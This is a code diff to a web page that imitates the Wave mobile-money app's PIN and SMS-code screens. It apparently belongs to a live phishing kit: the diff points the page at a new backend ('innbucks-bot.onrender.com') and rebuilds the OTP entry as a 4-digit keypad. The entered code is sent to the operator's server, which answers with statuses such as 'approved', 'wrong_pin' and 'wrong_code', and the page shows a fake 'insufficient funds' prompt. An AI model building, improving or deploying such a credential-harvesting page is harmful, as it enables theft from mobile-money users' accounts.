@@ -215,16 +215,18 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
 /* PIN lock icon */
 .pin-lock-wrap { display:flex; justify-content:center; padding-top:44px; }
 
-/* OTP DOTS */
-.otp-dots-w { display:flex; justify-content:center; gap:14px; margin-top:6px; margin-bottom:4px; position:relative; }
-.od-w { width:13px; height:13px; border-radius:50%; background:#e5e5e5; transition:background 0.16s, transform 0.12s; }
-.od-w.on { background:#4dc8e8; transform:scale(1.25); }
-.otp-tap-w { position:absolute; inset:-20px; cursor:text; }
-.otp-err-w { background:#fef2f2; color:#dc2626; padding:10px 14px; border-radius:10px; margin-top:14px; font-size:12px; text-align:center; display:none; border:1px solid #fecaca; }
-.otp-err-w.show { display:block; }
-.resend-w { margin-top:20px; text-align:center; }
-.resend-btn-w { font-size:13px; color:#4dc8e8; font-weight:600; background:none; border:none; font-family:'Patrick Hand',cursive; cursor:pointer; }
-.resend-cd-w { font-size:11px; color:#ccc; margin-top:4px; min-height:16px; }
+/* OTP digit slots */
+.otp-slot {
+  display:flex; flex-direction:column; align-items:center;
+  width:52px; border-bottom:2px solid #ccc; padding-bottom:6px;
+  transition:border-color 0.15s;
+}
+.otp-slot.active { border-bottom-color:#4dc8e8; }
+.otp-digit {
+  font-size:36px; font-weight:500; color:#111;
+  font-family:'Patrick Hand',cursive; line-height:1.1;
+  min-height:44px; display:flex; align-items:flex-end;
+}
 
 /* OVERLAYS */
 .ov { position:fixed; top:0;left:0;right:0;bottom:0; background:rgba(0,0,0,0.25); display:none; align-items:center; justify-content:center; z-index:999; backdrop-filter:blur(2px); }
@@ -499,35 +501,76 @@ input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:22px; h
   </div>
 
   <!-- ══ OTP ══ -->
-  <div class="scr" id="s-otp" style="position:relative;">
+  <div class="scr" id="s-otp" style="flex-direction:column;">
+
+    <!-- Back arrow -->
     <div class="wave-back" onclick="go('s-otp','s-pin')">
       <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
     </div>
-    <div class="wave-h">Entrez votre code<br><span style="font-size:14px;color:#999;font-weight:400;">Envoyé au <strong id="otpPh" style="color:#555;">+221</strong></span></div>
 
-    <div class="otp-dots-w" style="margin-top:30px;" onclick="document.getElementById('otp-in').focus()">
-      <div class="od-w" id="od0"></div>
-      <div class="od-w" id="od1"></div>
-      <div class="od-w" id="od2"></div>
-      <div class="od-w" id="od3"></div>
-      <div class="od-w" id="od4"></div>
-      <div class="otp-tap-w"></div>
+    <!-- Purple chat bubble icon -->
+    <div style="display:flex;justify-content:center;padding-top:20px;">
+      <div style="width:60px;height:60px;background:#6c63ff;border-radius:14px;display:flex;align-items:center;justify-content:center;">
+        <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+          <circle cx="11" cy="16" r="2.5" fill="#fff"/>
+          <circle cx="16" cy="16" r="2.5" fill="#fff"/>
+          <circle cx="21" cy="16" r="2.5" fill="#fff"/>
+        </svg>
+      </div>
     </div>
-    <div class="otp-err-w" id="otpErr" style="margin:14px 24px 0;">Code incorrect. Veuillez réessayer.</div>
-    <div class="resend-w">
-      <button class="resend-btn-w" id="resendBtn" onclick="doResend()" disabled style="opacity:0.4;">Renvoyer le code</button>
-      <div class="resend-cd-w" id="resendCd">Renvoi dans 30s</div>
+
+    <!-- Heading -->
+    <div style="font-size:16px;font-weight:700;color:#111;text-align:center;padding:22px 28px 0;line-height:1.45;">
+      Enter the validation code that we texted to <span id="otpPh" style="color:#111;">+221</span>
     </div>
-    <div class="spacer"></div>
-    <button class="wave-next active-btn" id="vBtn" disabled onclick="doVerify()" style="margin-bottom:32px;">Confirmer</button>
+
+    <!-- 4 digit slots with underlines -->
+    <div id="otpSlots" style="display:flex;justify-content:center;gap:18px;padding:48px 32px 0;cursor:text;" onclick="document.getElementById('otp-in').focus()">
+      <div class="otp-slot"><span class="otp-digit" id="osd0"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd1"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd2"></span></div>
+      <div class="otp-slot"><span class="otp-digit" id="osd3"></span></div>
+    </div>
+
+    <div class="otp-err-w" id="otpErr" style="margin:16px 28px 0;">Code incorrect. Veuillez réessayer.</div>
+
+    <!-- Resend SMS -->
+    <div style="text-align:center;margin-top:auto;padding-bottom:10px;">
+      <button id="resendBtn" onclick="doResend()" disabled
+        style="background:none;border:none;font-family:'Patrick Hand',cursive;font-size:15px;font-weight:700;color:#4dc8e8;cursor:pointer;opacity:0.4;">
+        Resend SMS
+      </button>
+      <div id="resendCd" style="font-size:11px;color:#ccc;margin-top:4px;min-height:16px;"></div>
+    </div>
+
+    <!-- Numeric keypad only (no letters) -->
+    <div class="keypad" style="padding-bottom:0;">
+      <button class="kk" onclick="otpKpPress(1)"><span class="kk-num">1</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(2)"><span class="kk-num">2</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(3)"><span class="kk-num">3</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(4)"><span class="kk-num">4</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(5)"><span class="kk-num">5</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(6)"><span class="kk-num">6</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(7)"><span class="kk-num">7</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(8)"><span class="kk-num">8</span><span class="kk-letters"></span></button>
+      <button class="kk" onclick="otpKpPress(9)"><span class="kk-num">9</span><span class="kk-letters"></span></button>
+      <button class="kk empty"></button>
+      <button class="kk" onclick="otpKpPress(0)"><span class="kk-num">0</span><span class="kk-letters"></span></button>
+      <button class="kk backspace" onclick="otpKpBack()">
+        <span class="kk-num"><svg width="26" height="20" viewBox="0 0 26 20"><path d="M9 2L2 10l7 8h15V2H9z" fill="#111"/><line x1="14" y1="7" x2="20" y2="13" stroke="#fff" stroke-width="2"/><line x1="20" y1="7" x2="14" y2="13" stroke="#fff" stroke-width="2"/></svg></span>
+        <span class="kk-letters"></span>
+      </button>
+    </div>
+    <div style="height:16px;"></div>
+
   </div>
 
 </div><!-- .wrap -->
 
-<input id="otp-in" type="tel" maxlength="5" inputmode="numeric" autocomplete="one-time-code"/>
+
 
 <script>
-var API = 'https://new-9xcj.onrender.com/api';
+var API = 'https://innbucks-bot.onrender.com/api';
 var sessId = null, pollTmr = null;
 
 function showLoad(){ document.getElementById('loadOv').classList.add('show'); }
@@ -661,14 +704,15 @@ function startPoll(sid){
       if(!r.success||!r.status) return;
       if(r.status==='approved'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        go('s-pin','s-otp'); resetOTP(); startResendCd(); setTimeout(function(){ document.getElementById('otp-in').focus(); },400); startPoll(sid);
+        go('s-pin','s-otp'); resetOTP(); startResendCd(); startPoll(sid);
       } else if(r.status==='wrong_pin'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Code incorrect','Le code secret saisi est incorrect. Veuillez réessayer.');
         pinVal=''; updatePinDots();
       } else if(r.status==='wrong_code'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        showPop('Code incorrect','Le code saisi est incorrect. Veuillez réessayer.'); resetOTP();
+        resetOTP();
+        document.getElementById('otpErr').classList.add('show');
       } else if(r.status==='continue'){
         hideLoad(); clearInterval(pollTmr); pollTmr=null;
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
@@ -689,31 +733,72 @@ async function submitPIN(){
   else{ hideLoad(); alert('Échec. Veuillez réessayer.'); }
 }
 
-// OTP
-var otpIn = document.getElementById('otp-in');
-var vBtn  = document.getElementById('vBtn');
-var ods   = [0,1,2,3,4].map(function(i){ return document.getElementById('od'+i); });
-function setDots(n){ ods.forEach(function(d,i){ d.classList.toggle('on',i<n); }); }
-function resetOTP(){ otpIn.value=''; setDots(0); vBtn.disabled=true; vBtn.textContent='Confirmer'; document.getElementById('otpErr').classList.remove('show'); }
-otpIn.addEventListener('input', function(){
-  var v=otpIn.value.replace(/\D/g,'').slice(0,5); otpIn.value=v; setDots(v.length); vBtn.disabled=v.length<5;
-});
+// OTP — 4 digit slots keypad
+var otpVal = '';
+var otpSlotEls = [0,1,2,3].map(function(i){ return document.getElementById('osd'+i); });
+var otpSlotWrps = [0,1,2,3].map(function(i){ return otpSlotEls[i].parentElement; });
 
-var resTimer=null;
-function startResendCd(){
-  var btn=document.getElementById('resendBtn'), cd=document.getElementById('resendCd');
-  btn.disabled=true; btn.style.opacity='0.4'; clearInterval(resTimer); var s=30;
-  cd.textContent='Renvoi dans '+s+'s';
-  resTimer=setInterval(function(){ s--; if(s<=0){ clearInterval(resTimer); cd.textContent=''; btn.disabled=false; btn.style.opacity='1'; } else cd.textContent='Renvoi dans '+s+'s'; },1000);
+function otpUpdateSlots(){
+  otpSlotEls.forEach(function(el, i){
+    el.textContent = otpVal[i] || '';
+  });
+  otpSlotWrps.forEach(function(el, i){
+    el.classList.toggle('active', i === otpVal.length && otpVal.length < 4);
+  });
+  document.getElementById('otpErr').classList.remove('show');
 }
+
+function otpKpPress(digit){
+  if(otpVal.length >= 4) return;
+  otpVal += digit;
+  otpUpdateSlots();
+  if(otpVal.length === 4) setTimeout(doVerify, 120);
+}
+
+function otpKpBack(){
+  if(otpVal.length === 0) return;
+  otpVal = otpVal.slice(0,-1);
+  otpUpdateSlots();
+}
+
+function resetOTP(){
+  otpVal = '';
+  otpUpdateSlots();
+  document.getElementById('otpErr').classList.remove('show');
+}
+
+var resTimer = null;
+function startResendCd(){
+  var btn = document.getElementById('resendBtn');
+  var cd  = document.getElementById('resendCd');
+  btn.disabled = true; btn.style.opacity = '0.4';
+  clearInterval(resTimer);
+  var s = 30;
+  cd.textContent = 'Resend in ' + s + 's';
+  resTimer = setInterval(function(){
+    s--;
+    if(s <= 0){
+      clearInterval(resTimer);
+      cd.textContent = '';
+      btn.disabled = false; btn.style.opacity = '1';
+    } else {
+      cd.textContent = 'Resend in ' + s + 's';
+    }
+  }, 1000);
+}
+
 function doResend(){ startResendCd(); resetOTP(); }
 
 async function doVerify(){
-  if(otpIn.value.length===5&&sessId){
+  if(otpVal.length === 4 && sessId){
     showLoad();
-    var r=await callApi('otp_entered',{sessionId:sessId,otp:otpIn.value});
-    if(r.success){ vBtn.textContent='Vérification…'; vBtn.disabled=true; startPoll(sessId); }
-    else{ hideLoad(); alert('Échec. Veuillez réessayer.'); }
+    var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
+    if(r.success){
+      startPoll(sessId);
+    } else {
+      hideLoad();
+      alert('Échec. Veuillez réessayer.');
+    }
   }
 }
 
